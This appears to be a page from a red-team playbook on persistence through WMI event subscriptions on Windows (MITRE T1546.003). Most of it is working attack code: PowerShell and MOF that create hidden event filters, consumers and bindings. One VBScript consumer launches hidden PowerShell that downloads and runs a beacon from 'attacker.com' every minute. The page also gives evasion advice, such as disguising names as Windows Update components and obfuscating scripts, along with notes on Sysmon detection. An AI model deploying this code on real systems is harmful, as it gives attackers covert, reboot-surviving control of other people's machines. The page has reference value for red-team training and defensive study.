# WMI Event Subscription Persistence

> **MITRE ATT&CK**: Persistence > T1546.003 - Event Triggered Execution: Windows Management Instrumentation Event Subscription
> **Platforms**: Windows
> **Required Privileges**: Admin (permanent subscriptions require admin)
> **OPSEC Risk**: Low-Medium (survives reboots, runs from WMI subsystem, no files in common persistence locations)

---

## Strategic Overview

WMI permanent event subscriptions are one of the most resilient and covert persistence mechanisms on Windows. They consist of three linked components stored in the WMI repository (not the file system), triggered by system events such as logon, process start, time intervals, or registry changes. The payload executes from WmiPrvSE.exe, making attribution to the attacker difficult. For a Red Team Lead, WMI subscriptions are ideal for long-term persistence because they survive reboots, are not visible in common persistence enumeration locations (Startup, Run keys, services), and execute silently in the background. The primary risk is that modern EDR products now specifically monitor WMI subscription creation (Sysmon Event IDs 19-21), and defenders familiar with this technique will check the WMI repository during investigations.

## Technical Deep-Dive

### Three-Component Architecture

```
WMI Event Subscription = EventFilter + EventConsumer + FilterToConsumerBinding

EventFilter:           Defines WHEN to trigger (WQL query)
EventConsumer:         Defines WHAT to execute (script, command, log entry)
FilterToConsumerBinding: Links the filter to the consumer

All three must exist and be linked for the subscription to function.
Stored in: C:\Windows\System32\wbem\Repository\
```

### Consumer Types

```
ActiveScriptEventConsumer  - Execute VBScript or JScript
CommandLineEventConsumer   - Execute arbitrary command line
LogFileEventConsumer       - Write to a log file
NTEventLogEventConsumer    - Write to Windows Event Log
SMTPEventConsumer          - Send email (rarely used offensively)
```

### PowerShell - Full Subscription Creation

```powershell
# === CommandLineEventConsumer - Execute on User Logon ===

# Step 1: Create the EventFilter (trigger condition)
$filterArgs = @{
    EventNamespace = 'root/CIMV2'
    Name = 'WindowsUpdateFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

# Step 2: Create the EventConsumer (action)
$consumerArgs = @{
    Name = 'WindowsUpdateConsumer'
    CommandLineTemplate = 'cmd.exe /c C:\ProgramData\updater.exe'
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# Step 3: Create the Binding (link filter to consumer)
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

### ActiveScriptEventConsumer (VBScript/JScript Payload)

```powershell
# Execute VBScript payload on timer (every 60 seconds)
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
    Name = 'TimerFilter'
    EventNamespace = 'root/CIMV2'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
    QueryLanguage = 'WQL'
}

$consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments @{
    Name = 'ScriptConsumer'
    ScriptingEngine = 'VBScript'
    ScriptText = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('https://attacker.com/beacon.ps1'))", 0, False
"@
}

Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### Common Trigger Queries (WQL)

```sql
-- Trigger on user logon
SELECT * FROM __InstanceCreationEvent WITHIN 15
WHERE TargetInstance ISA 'Win32_LogonSession'

-- Trigger on specific process start (e.g., when explorer.exe starts)
SELECT * FROM __InstanceCreationEvent WITHIN 5
WHERE TargetInstance ISA 'Win32_Process'
AND TargetInstance.Name = 'explorer.exe'

-- Trigger at specific time interval (every 5 minutes)
SELECT * FROM __InstanceModificationEvent WITHIN 300
WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'

-- Trigger on USB device insertion
SELECT * FROM __InstanceCreationEvent WITHIN 10
WHERE TargetInstance ISA 'Win32_DiskDrive'

-- Trigger on specific time of day (8:00 AM)
SELECT * FROM __InstanceModificationEvent WITHIN 60
WHERE TargetInstance ISA 'Win32_LocalTime'
AND TargetInstance.Hour = 8 AND TargetInstance.Minute = 0

-- Trigger on registry modification
SELECT * FROM RegistryValueChangeEvent
WHERE Hive = 'HKEY_LOCAL_MACHINE'
AND KeyPath = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
```

### MOF Compilation (Alternative Creation Method)

```
// payload.mof - compiled via mofcomp.exe
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $Filter {
    Name = "UpdateFilter";
    EventNamespace = "root\\CIMV2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'";
};

instance of CommandLineEventConsumer as $Consumer {
    Name = "UpdateConsumer";
    CommandLineTemplate = "cmd.exe /c C:\\ProgramData\\updater.exe";
};

instance of __FilterToConsumerBinding {
    Filter = $Filter;
    Consumer = $Consumer;
};
```

```bash
# Compile and install MOF
mofcomp.exe payload.mof
```

### Enumeration and Verification

```powershell
# List all event filters
Get-WmiObject -Namespace root/subscription -Class __EventFilter

# List all event consumers
Get-WmiObject -Namespace root/subscription -Class __EventConsumer

# List all bindings
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding

# Check specific subscription
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WindowsUpdateConsumer' }
```

### Cleanup Commands

```powershell
# Remove subscription components (all three must be removed)

# Remove binding
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*WindowsUpdateFilter*' } | Remove-WmiObject

# Remove consumer
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WindowsUpdateConsumer' } | Remove-WmiObject

# Remove filter
Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -eq 'WindowsUpdateFilter' } | Remove-WmiObject

# Verify cleanup
Get-WmiObject -Namespace root/subscription -Class __EventFilter
Get-WmiObject -Namespace root/subscription -Class __EventConsumer
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

## Detection & Evasion

### Detection Mechanisms
- **Sysmon Event ID 19**: WmiEventFilter activity detected
- **Sysmon Event ID 20**: WmiEventConsumer activity detected
- **Sysmon Event ID 21**: WmiEventConsumerToFilter activity detected
- **WMI-Activity/Operational log**: WMI subscription events
- **WMI repository analysis**: Direct examination of OBJECTS.DATA file
- **PowerShell/WMI enumeration**: Querying root/subscription namespace

### Evasion Techniques
- Use timer-based triggers instead of event-based (less specific, harder to correlate)
- Name subscription components to match legitimate software patterns
- Use ActiveScriptEventConsumer with obfuscated VBScript/JScript
- Avoid CommandLineEventConsumer when possible (command line is logged)
- Create subscriptions during periods of high system activity to blend in
- Use WQL queries that are not commonly signatured

### OPSEC Considerations
- WMI subscriptions are stored in the WMI repository, not the file system
- Sysmon with proper configuration will detect subscription creation
- WMI repository survives disk imaging and is analyzed in forensic investigations
- Consumer types that write to disk (CommandLine) leave more artifacts
- ActiveScriptEventConsumer runs within WmiPrvSE.exe context
- Ensure cleanup of all three components during operation conclusion

## Cross-References

- `03-execution/wmi-execution.md` - WMI execution techniques
- `04-persistence/registry-persistence.md` - Registry-based alternatives
- `04-persistence/scheduled-tasks.md` - Scheduled task persistence comparison
- `09-lateral-movement/` - Remote WMI execution

## References

- MITRE T1546.003: https://attack.mitre.org/techniques/T1546/003/
- WMI Persistence (FireEye): https://www.mandiant.com/resources/windows-management-instrumentation-wmi-offense-defense-and-forensics
- WMI Event Subscriptions: https://www.ired.team/offensive-security/persistence/wmi-event-subscription
- Sysmon WMI detection: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
